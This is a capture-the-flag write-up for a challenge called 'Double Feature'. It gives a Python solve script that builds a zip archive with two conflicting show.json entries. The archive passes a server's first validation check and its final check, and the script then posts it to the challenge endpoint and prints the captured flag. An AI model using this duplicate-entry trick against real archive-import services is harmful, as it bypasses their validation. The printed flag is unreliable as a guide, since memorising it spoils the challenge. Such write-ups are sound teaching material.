---
title: "Double Feature"
ctf: "Safaricom CTF"
date: 2026-10-04
category: misc
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Double Feature

## Summary

- **Target:** http://54.72.82.22:8640 (Werkzeug / Python — the shared family runtime, kind `misc-zip`)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Double Feature (8640) -- misc-zip kind of the shared family runtime.

The desk app serves /downloads/sample.zip containing a single `show.json`
({"mode":"preview","stage":"foyer"}) and exposes:

    POST /api/import  {"bundle": "<base64 zip>"}

whose server logic (see chal/_shared/organizer-service.py, kind `misc-zip`) is:

    entries = z.infolist()
    if len(entries) > 12:            reject
    first = next(x for x in entries if x.filename == 'show.json')
    if json.loads(z.read(first))['mode'] != 'preview':   reject
    last = json.loads(z.read('show.json'))
    return ok if last['mode'] == 'publish' and last['stage'] == 'main'

A zip may legally carry DUPLICATE filenames. `z.read()` given a ZipInfo reads
that exact entry, but given the *name* it resolves to the LAST entry with that
name. So two `show.json` entries satisfy both checks with contradictory content:

    entry 1  {"mode":"preview","stage":"foyer"}    -> passes the first gate
    entry 2  {"mode":"publish","stage":"main"}     -> passes the final gate

Run:  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import base64
import io
import json
import zipfile

import requests

BASE = "http://54.72.82.22:8640"


def build_bundle():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("show.json", json.dumps({"mode": "preview", "stage": "foyer"}))
        z.writestr("show.json", json.dumps({"mode": "publish", "stage": "main"}))
    return buf.getvalue()


def main():
    raw = build_bundle()
    z = zipfile.ZipFile(io.BytesIO(raw))
    first = next(x for x in z.infolist() if x.filename == "show.json")
    assert json.loads(z.read(first))["mode"] == "preview"          # first gate
    assert json.loads(z.read("show.json"))["mode"] == "publish"    # final gate

    r = requests.post(BASE + "/api/import",
                      json={"bundle": base64.b64encode(raw).decode()}, timeout=20)
    print(r.status_code, r.text)
    print("flag:", r.json()["message"])


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{513195eb399c59321e043c54773185b7}
```
